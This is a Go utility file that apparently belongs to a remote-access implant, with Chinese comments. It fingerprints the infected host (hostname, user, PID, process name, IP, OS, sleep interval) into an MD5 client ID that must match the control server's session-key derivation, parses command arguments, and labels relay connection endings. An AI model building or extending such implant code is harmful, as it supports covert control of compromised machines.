package utils

import (
	"bytes"
	"crypto/md5"
	"encoding/binary"
	"errors"
	"fmt"
	"implant/core/config"
	"implant/core/sysinfo"
	"io"
	"net"
)

var MetaInfo []byte

func BytesCombine(pBytes ...[]byte) []byte {
	return bytes.Join(pBytes, []byte(""))
}
func ParseAnArg(buf *bytes.Buffer) ([]byte, error) {
	argLenBytes := make([]byte, 4)
	_, err := buf.Read(argLenBytes)
	if err != nil {
		return nil, err
	}
	argLen := binary.BigEndian.Uint32(argLenBytes)
	if argLen != 0 {
		arg := make([]byte, argLen)
		_, err = buf.Read(arg)
		if err != nil {
			return nil, err
		}
		//args := strings.Split(strings.TrimRight(string(arg), "\x00"), "\x00")
		//return []byte(args[0]), nil
		return arg, nil
	} else {
		return nil, err
	}

}

// GetClientID 生成客户端唯一标识（用于兼容性，已弃用）
func GetClientID() string {
	processID := sysinfo.GetPID()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser, _ := sysinfo.GetUsername()

	// 组合信息生成唯一标识
	idInfo := fmt.Sprintf("%s-%s-%d-%d", hostName, currentUser, processID, localIP)

	// 生成MD5哈希作为客户端ID
	hasher := md5.New()
	hasher.Write([]byte(idInfo))
	hashBytes := hasher.Sum(nil)

	return fmt.Sprintf("%x", hashBytes)
}

// GetMetaInfoClientID 获取与服务端一致的ClientID（基于MetaInfo的MD5哈希）
func GetMetaInfoClientID() (string, error) {
	// 生成MetaInfo数据（与MakeMetaInfo()函数相同的逻辑）
	processID := sysinfo.GetPID()
	metadataFlag := sysinfo.GetMetaDataFlag()
	processName := sysinfo.GetProcessName()
	localIP := sysinfo.GetLocalIPInt()
	hostName := sysinfo.GetComputerName()
	currentUser, _ := sysinfo.GetUsername()

	processIDBytes := make([]byte, 4)
	flagBytes := make([]byte, 1)
	localIPBytes := make([]byte, 4)
	binary.BigEndian.PutUint32(processIDBytes, uint32(processID))
	flagBytes[0] = byte(metadataFlag)
	binary.BigEndian.PutUint32(localIPBytes, uint32(localIP))

	// 必须与 MakeMetaInfo() 完全一致(含 SleepSeconds 第 5 段):
	// 客户端本地 cid 与服务端 MD5(收到的 metainfo) 不同会导致会话密钥派生 uid 不一致 → 命令解密全挂
	osInfo := fmt.Sprintf("%s\t%s\t%s\t%s\t%d", hostName, currentUser, processName, osTypeName(), config.SleepSeconds())
	if len(osInfo) > 80 {
		osInfo = osInfo[:80]
	}
	osInfoBytes := []byte(osInfo)

	// 组合MetaInfo
	metaInfoBytes := BytesCombine(processIDBytes, flagBytes, localIPBytes, osInfoBytes)

	// 计算MD5哈希（与服务端encrypt.BytesToMD5函数相同）
	hasher := md5.New()
	hasher.Write(metaInfoBytes)
	md5Bytes := hasher.Sum(nil)

	return fmt.Sprintf("%x", md5Bytes), nil
}

// RelayEndState 把转发结束时的正常连接关闭(io.EOF/net.ErrClosed)降级为"正常关闭"，
// 避免半关闭 teardown 在日志里刷 "use of closed network connection" 噪音；真实错误照常返回。
// P2: 原实现分别在 commands/relayutil.go 与 services/proxy/relayutil.go 重复定义，统一收敛至此。
func RelayEndState(err error) string {
	if err == nil {
		return "正常"
	}
	if errors.Is(err, net.ErrClosed) || errors.Is(err, io.EOF) {
		return "正常关闭"
	}
	return fmt.Sprintf("错误: %v", err)
}
